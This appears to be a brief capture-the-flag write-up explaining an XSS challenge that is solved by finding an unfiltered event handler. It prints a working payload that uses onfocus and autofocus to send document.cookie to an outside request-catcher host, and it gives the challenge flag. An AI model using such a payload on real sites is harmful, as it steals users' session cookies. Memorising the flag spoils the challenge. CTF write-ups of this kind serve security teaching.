Ok this one is a little more complicated, but basically the idea here is that there are a few "onX" functions that I probably forgot, and they just need to find a good one that gets what they want.

Something like onfocus. This payload worked previously, but I'd need to test after hosting: 

<input onfocus="location=`https://yours.requestcatcher.com/?c=`+document.cookie" autofocus="">



Flag: `byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}`